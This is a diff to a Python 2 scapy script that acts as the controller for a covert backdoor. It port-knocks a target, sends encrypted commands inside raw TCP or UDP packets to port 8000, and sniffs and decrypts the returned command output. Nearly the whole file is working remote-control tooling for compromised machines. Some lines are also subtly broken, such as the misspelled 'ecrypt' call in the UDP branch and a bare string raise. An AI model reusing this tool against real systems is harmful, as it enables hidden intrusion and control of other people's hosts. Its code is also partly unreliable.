@@ -1,8 +1,12 @@
 #!/usr/bin/python
 
-import time, configfile, logging, encryption
+import time, configfile, logging, encryption, packetFunctions
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
+
+# flag to determine when to stop reading the results of a command and decrypt everything
+flag = False
+Results = ""
 
 def portKnock():
     for knock in configfile.knock:
@@ -15,22 +19,43 @@ def sendCommand(protocol, data, password):
         packet = IP(dst=configfile.ip)/TCP(dport=8000, sport=7999)/Raw(load=encryption.encrypt(password+data, configfile.password))
     if protocol == "udp":
         packet = IP(dst=configfile.ip)/UDP(dport=8000, sport=7999)/Raw(load=encryption.ecrypt(password+data, configfile.password))
-    send(packet)
+    send(packet, verbose=0)
 
 def recvCommand(packet):
-   if packet.haslayer(IP) and packet.haslayer(Raw):
-        data = encryption.decrypt(packet['Raw'].load, configfile.password)
-        if data.startswith(configfile.password):
-            data = data[len(configfile.password):]
-            print data
+   global flag
+   global Results
+   if packet.haslayer(IP):
+    if packet[IP].src == configfile.ip:
+        dataReceived = packetFunctions.parsePacket(packet)
+        Results += (dataReceived)
+        if packet.haslayer(Raw):
+            if packet[Raw].load == configfile.password:
+                print "Got password"
+                flag = True
+                decryptedData = encryption.decrypt(Results, configfile.password)
+                if decryptedData.startswith(configfile.password):
+                    data = decryptedData[len(configfile.password):]
+                else:
+                    raise "Incorrect password in data."
+                print data
+                Results = ""
 
 def main():
+    global flag
     portKnock()
 
     while 1:
         command = raw_input("Enter command: ")
         sendCommand(configfile.protocol, command, configfile.password)
-        sniff(filter='dst port 8000 and src port 8000', count=1, prn=recvCommand)
+        flag = False
+        
+        while 1:
+            sniff(filter='{0} and dst port 8000'.format(configfile.protocol), count=1, prn=recvCommand)
+            if flag == True:
+                break
 
 if __name__ == '__main__':
-    main()
+    try:
+        main()
+    except KeyboardInterrupt:
+        print "exiting.."
